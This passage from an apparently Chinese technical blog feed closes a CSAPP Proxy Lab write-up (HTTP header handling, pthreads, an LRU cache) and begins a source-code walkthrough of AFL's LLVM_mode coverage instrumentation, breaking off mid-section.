<li>主要的失分点在于空间利用率。大部分测试样例的空间利用率都挺高，只有少部分的一些样例需要优化，例如realloc。<br>
该代码仍然需要针对realloc的测试样例进行更深层次的优化。但编写这个lab的目的在于<strong>更深入的了解动态内存管理机制</strong>，笔者认为已经差不多达到了这个目的，所以没有继续进行优化。</li>
<li>吞吐量拿到了满分，这可能是因为笔者机器速度比较快，所耗时间比较低。</li>
</ul>
</li>
</ul>
<h2 id="8-Proxy-Lab">8. Proxy Lab</h2>
<ul>
<li>在完成这个lab前，需要先看一下CSAPP中关于网络编程和并发编程的相关内容，同时要理解网络编程那一章中的tiny简易网页服务器的每一行代码。</li>
</ul>
<h3 id="1-Part-A-3">1) Part A</h3>
<ul>
<li>
<p>在Part A中，我们要完成以下几个任务</p>
<ul>
<li>读取客户端传来的http header</li>
<li>向http header中添加一些额外的header，例如<code>User-Agent、Host、Connection、Proxy-Connection</code>。如果原来的http header中已经包括了某个header，则不再添加。</li>
<li>修改客户端传来的http header中的第一行URI。<br>
例如：修改<code>GET http://localhost:80/index.html HTTP/1.1</code>为<code>GET /index.html HTTP/1.1</code></li>
<li>将修改好的http header发送给服务器</li>
<li>将服务器返回的数据转发给客户端</li>
</ul>
</li>
<li>
<p>这部分内容分值为40分，其实现过程可以参照tiny网页服务器来实现。所设计的数据结构如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> value[MAXLINE];</span><br><span class="line">&#125;http_headers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> requestType[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> Protocol[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> address[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> resource[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> port[<span class="number">10</span>];</span><br><span class="line">&#125;http_target;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-Part-B-3">2) Part B</h3>
<ul>
<li>
<p>Part B中的任务只有一个，将程序修改为并发程序。</p>
</li>
<li>
<p>最简单的实现方式就是使用pthread来进行多线程处理。需要注意的是，每一条线程都必须使用<strong>分离模式</strong>，这样当某条线程结束任务后，其资源就可以自动被操作系统释放，而无需主线程主动释放，避免了内存泄露。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pthread_attr_t</span> thread_attr;</span><br><span class="line"><span class="keyword">pthread_t</span> thread;</span><br><span class="line"><span class="comment">// 设置线程状态为分离状态，防止大量线程结束后没有被回收，所导致的内存泄露</span></span><br><span class="line">pthread_attr_init(&amp;thread_attr);</span><br><span class="line">pthread_attr_setdetachstate(&amp;thread_attr, PTHREAD_CREATE_DETACHED);</span><br><span class="line"><span class="comment">// 初始化线程锁</span></span><br><span class="line">pthread_mutex_init(&amp;thread_mutex, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 线程执行doit(connfd);</span></span><br><span class="line">pthread_create(&amp;thread, &amp;thread_attr, doit, (<span class="keyword">void</span>*)(<span class="keyword">long</span>)connfd);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Part B分值15分。</p>
</li>
</ul>
<h3 id="3-Part-C-2">3) Part C</h3>
<ul>
<li>
<p>Part C要求我们对Proxy程序添加缓存功能，即当代理服务本身存放着某个资源的缓存时，代理服务就可以之间将该资源返回给客户端，而不需要向服务器申请。</p>
</li>
<li>
<p>使用LRU作为Cache的置换算法，单次读取某个资源时需要重新设置该资源的LRU变量。故其数据结构定义如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓存</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> address[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> content_type[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">size_t</span> lru;</span><br><span class="line">&#125;cache_line;</span><br><span class="line"><span class="keyword">size_t</span> current_lru = <span class="number">1</span>, cache_nums = <span class="number">0</span>, cache_size = <span class="number">0</span>;</span><br><span class="line">cache_line cache[MAX_CACHE_LINE];</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于写入数据会修改Cache，读取数据也会修改Cache，故每条线程在使用Cache时必须对资源上锁，防止条件竞争。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 互斥锁</span></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> thread_mutex;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">doit</span><span class="params">(<span class="keyword">void</span>* thread_arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 设置线程锁</span></span><br><span class="line">  pthread_mutex_lock(&amp;thread_mutex);</span><br><span class="line">  <span class="comment">// 判断该资源是否存在cache中</span></span><br><span class="line">  <span class="keyword">const</span> cache_line* tmpCache = readCache(uri);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 解锁</span></span><br><span class="line">  pthread_mutex_unlock(&amp;thread_mutex);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Part C分值也是15分。</p>
</li>
</ul>
<h3 id="4-测试">4) 测试</h3>
<ul>
<li>调试时，可以使用<code>curl -v &lt;webAddr&gt; --proxy &lt;proxyAddr&gt;</code>命令来调试，使用<code>-v</code>参数可以时curl输出发送的http内容与返回的http内容，便于调试。<br>
<img src="/2020/07/csapp-lab-writeup/proxy_curl.png" alt="img"></li>
<li>最终代码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/8.%20Proxy%20Lab/proxy.c" target="_blank" rel="noopener">github</a><br>
最后的评分如下<br>
<img src="/2020/07/csapp-lab-writeup/proxy_grade.png" alt="img"></li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL的LLVM_Mode</title>
    <url>/2020/07/AFL-LLVM-Mode/</url>
    <content><![CDATA[<h2 id="1-简介">1. 简介</h2>
<ul>
<li>AFL(American Fuzzy Lop)是一款基于覆盖引导(Coverage-guided)的模糊测试工具(Fuzzer)。它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率。</li>
<li>AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩。</li>
<li>今天的主题不是AFL本身，而是它的LLVM_mode模式。使用编译出的<code>afl-clang-fast</code>（LLVM_mode版<code>afl-clang</code>）编译程序，可以获得更快的Fuzzing速度。</li>
</ul>
<a id="more"></a>
<h2 id="2-环境配置">2. 环境配置</h2>
<ul>
<li>
<p>AFL的安装还是很省事的，进入源码目录直接<code>sudo make install</code>即可</p>
</li>
<li>
<p>编译AFL LLVM_mode的<code>afl-clang-fast</code>也很简单，只要进入<code>llvm_mode</code>文件夹并执行<code>make all</code>即可。<br>
<strong>注意！</strong> 编译<code>afl-clang-fast</code>时，所使用的<code>clang</code>版本一定要与<code>llvm-config</code>上显示的版本所<strong>对应</strong>，否则会报如下错误：<br>
<img src="/2020/07/AFL-LLVM-Mode/wrongEnv.png" alt="img"><br>
笔者的系统里装了llvm-6.0、llvm-8以及llvm-9，但对应的clang只安装了clang-8，所以链接时会报错。我的做法是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line"><span class="comment"># 修改llvm-config的符号链接，使其调用llvm-8的llvm-config</span></span><br><span class="line">sudo ln -snf ../lib/llvm-8/bin/llvm-config llvm-config</span><br><span class="line"><span class="built_in">cd</span> /usr/class/AFL-master/llvm_mode</span><br><span class="line"><span class="comment"># 注意要把曾经编译出来的目标文件删除，重新编译</span></span><br><span class="line">make clean</span><br><span class="line">make all</span><br><span class="line"><span class="comment"># 设置符号链接</span></span><br><span class="line">ln -s ../afl-clang-fast /usr/<span class="built_in">local</span>/bin/afl-clang-fast</span><br><span class="line">ln -s ../afl-clang-fast++ /usr/<span class="built_in">local</span>/bin/afl-clang-fast++</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后，使用<code>afl-clang-fast</code>编译前，需要设置一下<code>AFL_PATH</code>，使其可以找到<code>afl-llvm-rt.o</code> 和 <code>afl-llvm-pass.so</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_PATH=/usr/class/AFL-master/</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="3-afl-clang-fast-小叙">3. afl-clang-fast 小叙</h2>
<ul>
<li>
<p>afl-clang-fast实际上是CC/CXX的wrapper。它定义了一些宏，设置了一些参数，最终调用真正的编译器。</p>
<blockquote>
<p>CC指代C语言编译器，CXX指代C++编译器</p>
</blockquote>
<p>其主函数如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">"AFL_QUIET"</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line">    SAYF(cCYA <span class="string">"afl-clang-fast [tpcg] "</span> cBRI VERSION  cRST <span class="string">" by &lt;lszekeres@google.com&gt;\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    SAYF(cCYA <span class="string">"afl-clang-fast "</span> cBRI VERSION  cRST <span class="string">" by &lt;lszekeres@google.com&gt;\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^USE_TRACE_PC */</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">"\n"</span></span><br><span class="line">        <span class="string">"This is a helper application for afl-fuzz. It serves as a drop-in replacement\n"</span></span><br><span class="line">        <span class="string">"for clang, letting you recompile third-party code with the required runtime\n"</span></span><br><span class="line">        <span class="string">"instrumentation. A common use pattern would be one of the following:\n\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="string">"  CC=%s/afl-clang-fast ./configure\n"</span></span><br><span class="line">        <span class="string">"  CXX=%s/afl-clang-fast++ ./configure\n\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="string">"In contrast to the traditional afl-clang tool, this version is implemented as\n"</span></span><br><span class="line">        <span class="string">"an LLVM pass and tends to offer improved performance with slow programs.\n\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="string">"You can specify custom next-stage toolchain via AFL_CC and AFL_CXX. Setting\n"</span></span><br><span class="line">        <span class="string">"AFL_HARDEN enables hardening optimizations in the compiled code.\n\n"</span>,</span><br><span class="line">        BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ANDROID__</span></span><br><span class="line">  <span class="comment">// 查找必备库'afl-llvm-rt.o' 或 'afl-llvm-pass.so'</span></span><br><span class="line">  find_obj(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 设置CC或者CXX的参数</span></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line">  <span class="comment">// 调用execvp来执行CC或者CXX</span></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br><span class="line">  FATAL(<span class="string">"Oops, failed to execute '%s' - check your PATH"</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>我们可以在主函数中添加一点代码，将传递给CC/CXX的参数输出，便于学习</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出传递给CC或CXX的参数</span></span><br><span class="line"><span class="built_in">printf</span>(cCYA<span class="string">"CC/CXX args:\n"</span>cRST);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cc_par_cnt; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\targ%d: %s\n"</span>, i, cc_params[i]);</span><br></pre></td></tr></table></figure>
<p>示例<br>
<img src="/2020/07/AFL-LLVM-Mode/argsOutput.png" alt="img"></p>
</li>
<li>
<p>一个有趣的地方： <code>afl-clang-fast</code>与<code>afl-clang-fast++</code>是同一个文件，在函数<code>edit_params</code>中，其通过判断当前执行的文件名来决定使用CC或者CXX</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前所执行的文件名，确定执行CXX还是CC</span></span><br><span class="line"><span class="comment">// 查找当前执行的是afl-clang-fast还是afl-clang-fast++</span></span><br><span class="line">name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">'/'</span>);</span><br><span class="line"><span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">"afl-clang-fast++"</span>)) &#123;</span><br><span class="line">  u8* alt_cxx = getenv(<span class="string">"AFL_CXX"</span>);</span><br><span class="line">  cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">"clang++"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  u8* alt_cc = getenv(<span class="string">"AFL_CC"</span>);</span><br><span class="line">  cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">"clang"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>afl-clang-fast默认会打开O3级别的优化，如需关闭，需要设置环境变量</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_DONT_OPTIMIZE=1</span><br></pre></td></tr></table></figure>
<p>如需打开，只需执行</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> AFL_DONT_OPTIMIZE</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="4-afl-llvm-pass-源码分析">4. afl-llvm-pass 源码分析</h2>
<ul>
<li>
<p>afl-llvm-pass中，只有一个pass —— <code>AFLCoverage</code>。该pass会在每一个基础块的第一个可插入指令处插桩，检测 <strong>控制流的覆盖程度</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AFLCoverage</span> :</span> <span class="keyword">public</span> ModulePass &#123;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>runOnModule函数首先找出当前线程上下文中所对应的IntegerType，并且打印banner</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">AFLCoverage::runOnModule</span><span class="params">(Module &amp;M)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程上下文</span></span><br><span class="line">LLVMContext &amp;C = M.getContext();</span><br><span class="line"></span><br><span class="line">IntegerType *Int8Ty  = IntegerType::getInt8Ty(C);</span><br><span class="line">IntegerType *Int32Ty = IntegerType::getInt32Ty(C);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Show a banner */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> be_quiet = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果stderr可用，并且不是安静模式</span></span><br><span class="line"><span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">"AFL_QUIET"</span>)) &#123;</span><br><span class="line">  <span class="comment">// 输出信息</span></span><br><span class="line">  SAYF(cCYA <span class="string">"afl-llvm-pass "</span> cBRI VERSION cRST <span class="string">" by &lt;lszekeres@google.com&gt;\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后获取预设的代码插桩率</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Decide instrumentation ratio */</span></span><br><span class="line"><span class="comment">// 获取代码的插桩率（0-100）</span></span><br><span class="line"><span class="keyword">char</span>* inst_ratio_str = getenv(<span class="string">"AFL_INST_RATIO"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inst_ratio = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">"%u"</span>, &amp;inst_ratio) != <span class="number">1</span> || !inst_ratio ||</span><br><span class="line">      inst_ratio &gt; <span class="number">100</span>)</span><br><span class="line">    FATAL(<span class="string">"Bad value of AFL_INST_RATIO (must be between 1 and 100)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>接下来会获取全局变量中指向共享内存的指针，以及上一个基础块的编号</p>
<blockquote>
<p>这个共享内存上存放着各个控制流流经次数的计数器</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get globals for the SHM region and the previous location. Note that</span></span><br><span class="line"><span class="comment">   __afl_prev_loc is thread-local. */</span></span><br><span class="line"><span class="comment">// 指向  用于输出控制流覆盖次数的共享内存  的指针</span></span><br><span class="line">GlobalVariable *AFLMapPtr =</span><br><span class="line">    <span class="keyword">new</span> GlobalVariable(M, PointerType::get(Int8Ty, <span class="number">0</span>), <span class="literal">false</span>,</span><br><span class="line">                       GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">"__afl_area_ptr"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// AFLPrevLoc 用来表示前一个基本块的编号</span></span><br><span class="line">GlobalVariable *AFLPrevLoc = <span class="keyword">new</span> GlobalVariable(</span><br><span class="line">    M, Int32Ty, <span class="literal">false</span>, GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">"__afl_prev_loc"</span>,</span><br><span class="line">    <span class="number">0</span>, GlobalVariable::GeneralDynamicTLSModel, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>必要信息已经收集的差不多了，开始遍历每个基础块插桩</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> inst_blocks = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;F : M)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;BB : F) &#123;</span><br><span class="line">    <span class="comment">// 在每一个基础块前都插入代码。先查找插入点</span></span><br><span class="line">    BasicBlock::iterator IP = BB.getFirstInsertionPt();</span><br><span class="line">    <span class="function">IRBuilder&lt;&gt; <span class="title">IRB</span><span class="params">(&amp;(*IP))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据代码插桩率，随机插桩</span></span><br><span class="line">    <span class="keyword">if</span> (AFL_R(<span class="number">100</span>) &gt;= inst_ratio) <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>首先获取当前基础块与上一个基础块的编号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随即获取当前的基础块编号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cur_loc = AFL_R(MAP_SIZE);</span><br><span class="line">ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Load prev_loc */</span></span><br><span class="line"><span class="comment">// 加载上一个基础块的编号</span></span><br><span class="line">LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);</span><br><span class="line"><span class="comment">// Metadata在这里可以看作是一种调试信息</span></span><br><span class="line">PrevLoc-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::get(C, None));</span><br><span class="line">Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通过上述两个编号，计算出共享内存上所对应的地址</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Load SHM pointer */</span></span><br><span class="line">  <span class="comment">// 获取指向共享内存的指针</span></span><br><span class="line">  LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);</span><br><span class="line">  MapPtr-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::get(C, None));</span><br><span class="line">  <span class="comment">// GEP: GetElementPtr</span></span><br><span class="line">  <span class="comment">// 根据当前基础块与上一个基础块的编号，计算指向特定地址的指针</span></span><br><span class="line">  Value *MapPtrIdx =</span><br><span class="line">      IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该地址上的计数器递增</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Update bitmap */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该指针上的counter值自增一</span></span><br><span class="line">LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);</span><br><span class="line">Counter-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::get(C, None));</span><br><span class="line">Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, <span class="number">1</span>));</span><br><span class="line">IRB.CreateStore(Incr, MapPtrIdx)</span><br><span class="line">    -&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::get(C, None));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>设置<code>__afl_prev_loc</code>，作为下一个插桩基础块的 <em>“上一个基础块编号”</em></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set prev_loc to cur_loc &gt;&gt; 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将当前基础块的编号右移1位后，存入AFLPrevLoc</span></span><br><span class="line">StoreInst *Store =</span><br><span class="line">    IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; <span class="number">1</span>), AFLPrevLoc);</span><br><span class="line">Store-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::get(C, None));</span><br><span class="line"></span><br><span class="line">inst_blocks++;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>之所以要将当前基础块编号右移一位，是因为当基础块跳转<code>A-&gt;A</code>和<code>B-&gt;B</code>，或<code>A-&gt;B</code>和<code>B-&gt;A</code>，它们的编号做异或后的结果是相同的，无法区分，所以其中一个编号要右移一位。</p>
</blockquote>
</li>
<li>
<p>当前基础块插桩完成，开始遍历下一个基础块</p>
</li>
</ul>
</li>
<li>
<p>当插桩完成后，输出相关信息并返回</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Say something nice. */</span></span><br><span class="line"><span class="comment">// 完成插桩</span></span><br><span class="line"><span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!inst_blocks) WARNF(<span class="string">"No instrumentation targets found."</span>);</span><br><span class="line">  <span class="keyword">else</span> OKF(<span class="string">"Instrumented %u locations (%s mode, ratio %u%%)."</span>,</span><br><span class="line">           inst_blocks, getenv(<span class="string">"AFL_HARDEN"</span>) ? <span class="string">"hardened"</span> :</span><br><span class="line">           ((getenv(<span class="string">"AFL_USE_ASAN"</span>) || getenv(<span class="string">"AFL_USE_MSAN"</span>)) ?</span><br><span class="line">            <span class="string">"ASAN/MSAN"</span> : <span class="string">"non-hardened"</span>), inst_ratio);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>总结：</p>
<ul>
<li>该pass中的插桩主要完成以下几点
<ul>
<li>随机计算出当前基础块的编号</li>
<li>通过当前基础块编号与上一个基础块编号，计算出共享内存中对应的索引值idx
<blockquote>
<p>这块共享内存的实质就是一个<code>hashtable</code></p>
</blockquote>
</li>
<li>__afl_area_ptr[idx]++</li>
<li>设置__afl_prev_loc为当前的基础块编号，当前基础块插桩结束，准备插桩下一个基础块</li>
</ul>
</li>
<li>作用：
<ul>
<li>当有控制流到达当前基础块时，其共享内存对应位置，用于计数的值就会加一</li>
<li>而AFL可以根据该共享内存上的数据来判断控制流的覆盖程度，调整输入样本，使控制流能够覆盖更多的基础块</li>
</ul>
</li>
<li>缺点：
<ul>
<li>
<p>编号存在碰撞。不过根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      1,000 | 0.75%            | giflib, lzo</span><br><span class="line">      2,000 | 1.5%             | zlib, tar, xz</span><br><span class="line">      5,000 | 3.5%             | libpng, libwebp</span><br><span class="line">     10,000 | 7%               | libxml</span><br><span class="line">     20,000 | 14%              | sqlite</span><br><span class="line">     50,000 | 30%              | -</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>以下是经过pass处理后所插入的IR代码。这些IR代码在每个基础块前都会被插入。</p>
<blockquote>
<p>图片中的<code>39820</code>是当前基础块随机出的编号，<code>19910</code>是当前基础块编号右移一位的值<br>
<img src="/2020/07/AFL-LLVM-Mode/passIR.png" alt="img"><br>
使用afl-clang-fast，将源代码编译为IR的指令<br>
注意：最好设置环境变量<code>AFL_DONT_OPTIMIZE</code>以关闭编译器优化</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">afl-clang-fast -S -emit-llvm src.c</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="4-afl-llvm-rt-源码分析">4. afl-llvm-rt 源码分析</h2>
<blockquote>
<p>AFL LLVM_Mode中存在着三个特殊的功能。这三个功能的源码位于<code>afl-llvm-rt.o.c</code>中。</p>
</blockquote>
<ul>
<li>
<p>LLVM_mode 的第一种特殊功能 —— <strong>deferred instrumentation</strong><br>
AFL会尝试通过仅执行一次目标二进制文件来优化性能。它会暂停控制流，然后复制该“主”进程以持续提供fuzzer的目标。该功能在某些情况下可以减少操作系统、链接与libc内部执行程序的成本。<br>
若想使用该功能，则需要在代码中找到一个合适的位置，以便于进程的复制。这点需要格外的小心，尤其要避开程序在</p>
<ul>
<li>创建任何线程或子进程，因为forkserver无法很容易的复制它们。</li>
<li>设置或初始化计时器。</li>
<li>创建临时文件或者网络套接字等等</li>
<li>对fuzzer的任何访问，包括读取元数据。</li>
</ul>
<p>选好位置后，将下述代码添加到该位置上，之后使用afl-clang-fast重新编译代码即可</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">  __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>示例</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span></span><br><span class="line">  __AFL_INIT();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">2</span>, b;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">        b = <span class="number">3</span>*a - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        b = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>宏定义<code>__AFL_HAVE_MANUAL_CONTROL</code>与<code>__AFL_INIT()</code>的实现，都由afl-clang-fast以参数的形式传递给真正的编译器<br>
<img src="/2020/07/AFL-LLVM-Mode/afl-init.png" alt="img"><br>
等价于</p>
